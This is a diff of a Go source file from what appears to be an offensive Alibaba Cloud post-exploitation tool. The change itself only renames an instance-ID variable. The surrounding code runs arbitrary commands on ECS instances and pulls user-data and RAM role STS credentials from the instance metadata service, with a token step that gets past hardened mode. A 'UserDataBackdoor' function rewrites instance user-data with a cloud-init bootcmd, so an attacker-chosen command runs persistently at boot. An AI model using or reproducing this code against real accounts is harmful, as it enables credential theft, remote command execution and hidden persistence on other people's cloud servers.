@@ -58,12 +58,12 @@ func DeleteCommand(region string, CommandId string) {
 	log.Debugln("删除 CommandId (Delete CommandId): " + CommandId)
 }
 
-func InvokeCommand(region string, OSType string, command string, scriptType string, specifiedInstanceID string) (string, string) {
+func InvokeCommand(region string, OSType string, command string, scriptType string, specifiedInstanceId string) (string, string) {
 	CommandId := CreateCommand(region, OSType, command, scriptType)
 	request := ecs.CreateInvokeCommandRequest()
 	request.Scheme = "https"
 	request.CommandId = CommandId
-	request.InstanceId = &[]string{specifiedInstanceID}
+	request.InstanceId = &[]string{specifiedInstanceId}
 	response, err := ECSClient(region).InvokeCommand(request)
 	errutil.HandleErr(err)
 	InvokeId := response.InvokeId
@@ -98,38 +98,38 @@ func DescribeInvocationResults(region string, CommandId string, InvokeId string,
 	return output
 }
 
-func ECSExec(command string, commandFile string, scriptType string, specifiedInstanceID string, region string, batchCommand bool, userData bool, metaDataSTSToken bool, ecsFlushCache bool, lhost string, lport string, timeOut int, ecsExecAllRegions bool, userDataBackdoor string) {
+func ECSExec(command string, commandFile string, scriptType string, specifiedInstanceId string, region string, batchCommand bool, userData bool, metaDataSTSToken bool, ecsFlushCache bool, lhost string, lport string, timeOut int, ecsExecAllRegions bool, userDataBackdoor string) {
 	var InstancesList []Instances
 	if ecsFlushCache == false {
-		InstancesList = ReturnCacheInstanceList(specifiedInstanceID, region, "alibaba")
+		InstancesList = ReturnCacheInstanceList(specifiedInstanceId, region, "alibaba")
 	} else {
-		InstancesList = ReturnInstancesList(region, false, specifiedInstanceID, ecsExecAllRegions)
+		InstancesList = ReturnInstancesList(region, false, specifiedInstanceId, ecsExecAllRegions)
 	}
 	if len(InstancesList) == 0 {
-		if specifiedInstanceID == "all" {
+		if specifiedInstanceId == "all" {
 			log.Warnf("未发现实例，可以使用 --flushCache 刷新缓存后再试 (No instances found, You can use the --flushCache command to flush the cache and try again)")
 		} else {
-			log.Warnf("未找到 %s 实例的相关信息 (No information found about the %s instance)", specifiedInstanceID, specifiedInstanceID)
+			log.Warnf("未找到 %s 实例的相关信息 (No information found about the %s instance)", specifiedInstanceId, specifiedInstanceId)
 		}
 	} else {
-		if specifiedInstanceID == "all" {
+		if specifiedInstanceId == "all" {
 			var (
-				selectInstanceIDList []string
-				selectInstanceID     string
+				selectInstanceIdList []string
+				selectInstanceId     string
 			)
-			selectInstanceIDList = append(selectInstanceIDList, "全部实例 (all instances)")
+			selectInstanceIdList = append(selectInstanceIdList, "全部实例 (all instances)")
 			for _, i := range InstancesList {
-				selectInstanceIDList = append(selectInstanceIDList, fmt.Sprintf("%s (%s)", i.InstanceId, i.OSName))
+				selectInstanceIdList = append(selectInstanceIdList, fmt.Sprintf("%s (%s)", i.InstanceId, i.OSName))
 			}
-			sort.Strings(selectInstanceIDList)
+			sort.Strings(selectInstanceIdList)
 			prompt := &survey.Select{
 				Message: "选择一个实例 (Choose a instance): ",
-				Options: selectInstanceIDList,
+				Options: selectInstanceIdList,
 			}
-			survey.AskOne(prompt, &selectInstanceID)
+			survey.AskOne(prompt, &selectInstanceId)
 			for _, j := range InstancesList {
-				if selectInstanceID != "all" {
-					if selectInstanceID == fmt.Sprintf("%s (%s)", j.InstanceId, j.OSName) {
+				if selectInstanceId != "all" {
+					if selectInstanceId == fmt.Sprintf("%s (%s)", j.InstanceId, j.OSName) {
 						InstancesList = nil
 						InstancesList = append(InstancesList, j)
 					}
@@ -138,14 +138,14 @@ func ECSExec(command string, commandFile string, scriptType string, specifiedIns
 		}
 		var num = 0
 		for _, i := range InstancesList {
-			specifiedInstanceID := i.InstanceId
+			specifiedInstanceId := i.InstanceId
 			if i.Status == "Running" {
 				num = num + 1
 				InstanceName := i.InstanceName
 				region := i.RegionId
 				OSType := i.OSType
 				if userData == true {
-					commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut, true)
+					commandResult := getUserData(region, OSType, scriptType, specifiedInstanceId, timeOut, true)
 					if commandResult == "" {
 						fmt.Println("未找到用户数据 (User data not found)")
 					} else if commandResult == "disabled" {
@@ -154,7 +154,7 @@ func ECSExec(command string, commandFile string, scriptType string, specifiedIns
 						fmt.Println(commandResult)
 					}
 				} else if metaDataSTSToken == true {
-					commandResult := getMetaDataSTSToken(region, OSType, scriptType, specifiedInstanceID, timeOut)
+					commandResult := getMetaDataSTSToken(region, OSType, scriptType, specifiedInstanceId, timeOut)
 					if commandResult == "" {
 						fmt.Println("未找到临时访问密钥 (STS Token not found)")
 					} else if commandResult == "disabled" {
@@ -163,7 +163,7 @@ func ECSExec(command string, commandFile string, scriptType string, specifiedIns
 						fmt.Println(commandResult)
 					}
 				} else if userDataBackdoor != "" {
-					UserDataBackdoor(i.RegionId, userDataBackdoor, specifiedInstanceID, timeOut, scriptType, i.OSType, i.Status)
+					UserDataBackdoor(i.RegionId, userDataBackdoor, specifiedInstanceId, timeOut, scriptType, i.OSType, i.Status)
 				} else {
 					if batchCommand == true {
 						if OSType == "linux" {
@@ -188,11 +188,11 @@ func ECSExec(command string, commandFile string, scriptType string, specifiedIns
 						command = content[:len(content)-1]
 					}
 					if len(InstancesList) == 1 {
-						color.Printf("\n<lightGreen>%s (%s) ></> %s\n\n", specifiedInstanceID, InstanceName, command)
+						color.Printf("\n<lightGreen>%s (%s) ></> %s\n\n", specifiedInstanceId, InstanceName, command)
 					} else {
-						color.Printf("\n<lightGreen>%d %s (%s) ></> %s\n\n", num, specifiedInstanceID, InstanceName, command)
+						color.Printf("\n<lightGreen>%d %s (%s) ></> %s\n\n", num, specifiedInstanceId, InstanceName, command)
 					}
-					commandResult := getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
+					commandResult := getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
 					fmt.Println(commandResult)
 				}
 			}
@@ -200,8 +200,8 @@ func ECSExec(command string, commandFile string, scriptType string, specifiedIns
 	}
 }
 
-func getExecResult(region string, command string, OSType string, scriptType string, specifiedInstanceID string, timeOut int) string {
-	CommandId, InvokeId := InvokeCommand(region, OSType, command, scriptType, specifiedInstanceID)
+func getExecResult(region string, command string, OSType string, scriptType string, specifiedInstanceId string, timeOut int) string {
+	CommandId, InvokeId := InvokeCommand(region, OSType, command, scriptType, specifiedInstanceId)
 	output := DescribeInvocationResults(region, CommandId, InvokeId, timeOut)
 	var commandResult string
 	if output == "DQo=" {
@@ -214,7 +214,7 @@ func getExecResult(region string, command string, OSType string, scriptType stri
 	return commandResult
 }
 
-func getUserData(region string, OSType string, scriptType string, specifiedInstanceID string, timeOut int, isPrint bool) string {
+func getUserData(region string, OSType string, scriptType string, specifiedInstanceId string, timeOut int, isPrint bool) string {
 	var command string
 	if OSType == "linux" {
 		command = "curl -s http://100.100.100.200/latest/user-data/"
@@ -222,7 +222,7 @@ func getUserData(region string, OSType string, scriptType string, specifiedInsta
 		command = "Invoke-RestMethod http://100.100.100.200/latest/user-data/"
 		scriptType = "ps"
 	}
-	commandResult := getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
+	commandResult := getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
 	if strings.Contains(commandResult, "403 - Forbidden") {
 		log.Debugln("元数据访问模式可能被设置成了加固模式，尝试获取 Token 访问 (The metadata access mode may have been set to hardened mode and is trying to get Token access)")
 		if OSType == "linux" {
@@ -231,27 +231,27 @@ func getUserData(region string, OSType string, scriptType string, specifiedInsta
 			command = "$token = Invoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token-ttl-seconds\" = \"21600\"} -Method PUT –Uri http://100.100.100.200/latest/api/token\nInvoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token\" = $token} -Method GET -Uri http://100.100.100.200/latest/user-data/"
 			scriptType = "ps"
 		}
-		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
+		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
 		if strings.Contains(commandResult, "404 - Not Found") || strings.Contains(commandResult, "403 - Forbidden") {
 			if isPrint {
-				color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+				color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
 			}
 			commandResult = "disabled"
 		}
 	} else if strings.Contains(commandResult, "404 - Not Found") {
 		if isPrint {
-			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
 		}
 		commandResult = ""
 	} else {
 		if isPrint {
-			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
 		}
 	}
 	return commandResult
 }
 
-func getMetaDataSTSToken(region string, OSType string, scriptType string, specifiedInstanceID string, timeOut int) string {
+func getMetaDataSTSToken(region string, OSType string, scriptType string, specifiedInstanceId string, timeOut int) string {
 	var command string
 	var commandResult string
 	if OSType == "linux" {
@@ -260,7 +260,7 @@ func getMetaDataSTSToken(region string, OSType string, scriptType string, specif
 		command = "Invoke-RestMethod http://100.100.100.200/latest/meta-data/ram/security-credentials/"
 		scriptType = "ps"
 	}
-	roleName := getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
+	roleName := getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
 
 	if strings.Contains(roleName, "403 - Forbidden") {
 		log.Debugln("元数据访问模式可能被设置成了加固模式，尝试获取 Token 访问 (The metadata access mode may have been set to hardened mode and is trying to get Token access)")
@@ -270,9 +270,9 @@ func getMetaDataSTSToken(region string, OSType string, scriptType string, specif
 			command = "$token = Invoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token-ttl-seconds\" = \"21600\"} -Method PUT –Uri http://100.100.100.200/latest/api/token\nInvoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token\" = $token} -Method GET -Uri http://100.100.100.200/latest/meta-data/ram/security-credentials/"
 			scriptType = "ps"
 		}
-		roleName = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
+		roleName = getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
 		if strings.Contains(roleName, "404 - Not Found") || strings.Contains(roleName, "403 - Forbidden") {
-			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
 			commandResult = "disabled"
 		} else {
 			if OSType == "linux" {
@@ -281,11 +281,11 @@ func getMetaDataSTSToken(region string, OSType string, scriptType string, specif
 				command = "Invoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token\" = $token} -Method GET -Uri http://100.100.100.200/latest/meta-data/ram/security-credentials/" + roleName
 				scriptType = "ps"
 			}
-			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
-			commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
+			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
+			commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
 		}
 	} else if strings.Contains(roleName, "404 - Not Found") {
-		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
 		commandResult = ""
 	} else {
 		if OSType == "linux" {
@@ -294,16 +294,16 @@ func getMetaDataSTSToken(region string, OSType string, scriptType string, specif
 			command = "Invoke-RestMethod http://100.100.100.200/latest/meta-data/ram/security-credentials/" + roleName
 			scriptType = "ps"
 		}
-		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
-		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
+		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
+		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
 	}
 	return commandResult
 }
 
-func UserDataBackdoor(region string, command string, specifiedInstanceID string, timeOut int, scriptType string, OSType string, ecsStatus string) {
+func UserDataBackdoor(region string, command string, specifiedInstanceId string, timeOut int, scriptType string, OSType string, ecsStatus string) {
 	var commandResult1 string
 	if ecsStatus == "Running" {
-		commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut, false)
+		commandResult := getUserData(region, OSType, scriptType, specifiedInstanceId, timeOut, false)
 		commandResult1 = commandResult
 		if commandResult == "disabled" {
 			log.Warnln("元数据拒绝访问，无法读取到用户数据 (Metadata Access Denied. Unable to retrieve user data.)")
@@ -325,7 +325,7 @@ func UserDataBackdoor(region string, command string, specifiedInstanceID string,
 	}
 	request := ecs.CreateModifyInstanceAttributeRequest()
 	request.Scheme = "https"
-	request.InstanceId = specifiedInstanceID
+	request.InstanceId = specifiedInstanceId
 	userdata, _ := base64.StdEncoding.DecodeString("I2Nsb3VkLWNvbmZpZwpib290Y21kOgogIC0g")
 	userdataStr := string(userdata)
 	userdataStr = fmt.Sprintf("%s%s", userdataStr, command)
@@ -338,7 +338,7 @@ func UserDataBackdoor(region string, command string, specifiedInstanceID string,
 	if commandResult == 200 {
 		if ecsStatus == "Running" {
 			log.Infoln("覆盖写入成功 (Overwrite write successful.)")
-			commandResult2 := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut, false)
+			commandResult2 := getUserData(region, OSType, scriptType, specifiedInstanceId, timeOut, false)
 			color.Printf("\n<lightGreen>原来的用户数据 (Original user data): </> \n%s\n", commandResult1)
 			color.Printf("\n<lightGreen>现在的用户数据 (Current user data): </> \n%s\n\n", commandResult2)
 		} else {
@@ -350,13 +350,13 @@ func UserDataBackdoor(region string, command string, specifiedInstanceID string,
 	}
 }
 
-func ReturnCacheInstanceList(specifiedInstanceID string, region string, provider string) []Instances {
+func ReturnCacheInstanceList(specifiedInstanceId string, region string, provider string) []Instances {
 	var InstancesList []Instances
 	data := cmdutil.ReadECSCache(provider)
 	for _, v := range data {
 		switch {
-		case specifiedInstanceID != "all" && region != "all":
-			if specifiedInstanceID == v.InstanceId && region == v.RegionId {
+		case specifiedInstanceId != "all" && region != "all":
+			if specifiedInstanceId == v.InstanceId && region == v.RegionId {
 				obj := Instances{
 					InstanceId:       v.InstanceId,
 					InstanceName:     v.InstanceName,
@@ -369,8 +369,8 @@ func ReturnCacheInstanceList(specifiedInstanceID string, region string, provider
 				}
 				InstancesList = append(InstancesList, obj)
 			}
-		case specifiedInstanceID != "all" && region == "all":
-			if specifiedInstanceID == v.InstanceId {
+		case specifiedInstanceId != "all" && region == "all":
+			if specifiedInstanceId == v.InstanceId {
 				obj := Instances{
 					InstanceId:       v.InstanceId,
 					InstanceName:     v.InstanceName,
@@ -383,7 +383,7 @@ func ReturnCacheInstanceList(specifiedInstanceID string, region string, provider
 				}
 				InstancesList = append(InstancesList, obj)
 			}
-		case specifiedInstanceID == "all" && region != "all":
+		case specifiedInstanceId == "all" && region != "all":
 			if region == v.RegionId {
 				obj := Instances{
 					InstanceId:       v.InstanceId,
@@ -397,7 +397,7 @@ func ReturnCacheInstanceList(specifiedInstanceID string, region string, provider
 				}
 				InstancesList = append(InstancesList, obj)
 			}
-		case specifiedInstanceID == "all" && region == "all":
+		case specifiedInstanceId == "all" && region == "all":
 			obj := Instances{
 				InstanceId:       v.InstanceId,
 				InstanceName:     v.InstanceName,
